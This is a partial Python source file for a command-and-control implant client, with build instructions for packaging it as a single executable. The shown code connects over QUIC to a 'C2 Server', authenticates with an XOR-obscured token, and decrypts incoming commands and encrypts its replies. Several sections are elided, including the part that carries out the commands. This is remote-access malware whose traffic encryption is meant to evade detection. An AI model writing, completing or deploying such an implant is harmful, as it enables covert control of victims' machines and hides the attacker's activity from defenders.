# pyinstaller --onefile QUIC_XOR.py
...
def xor_decrypt_base64(data, key):
    decrypted_bytes = b64decode(data)
...
class QUICClientPayload(QuicConnectionProtocol):
    ...
    def connection_made(self, transport):
        ...
        token = xor_encrypt_decrypt(b"61bd769e-1a73-4efe-84e3-6aa1fbf9cbbb", ENCRYPTION_KEY)
        stream_id = self._quic.get_next_available_stream_id()
        self._quic.send_stream_data(stream_id, token.encode(), end_stream=True)
    ...
    def quic_event_received(self, event):
        if isinstance(event, StreamDataReceived):
            ...
            if event.end_stream:
                try:
                    encrypted_message = self._buffer.decode(errors="ignore").strip()
                    command = xor_decrypt_base64(encrypted_message, ENCRYPTION_KEY)
                except Exception as e:
                    print(f"[!] Failed to decrypt command: {str(e)}")
                    self._buffer = b''
                    return

                self._buffer = b''

                if not self._authenticated and command.lower().startswith("ver"):
    ...
    def respond(self, response: str):
        try:
            encrypted_response = xor_encrypt_decrypt(response.encode(), ENCRYPTION_KEY)
            stream_id = self._quic.get_next_available_stream_id()
            self._quic.send_stream_data(stream_id, encrypted_response.encode(), end_stream=True)
            self.transmit()
        except Exception as e:
            print(f"[!] Failed to respond: {str(e)}")
...
async def run_quic_client():
    ...
    async with connect(host, port, configuration=config, create_protocol=QUICClientPayload) as connection:
        print("[+] Connected to QUIC C2 Server.")
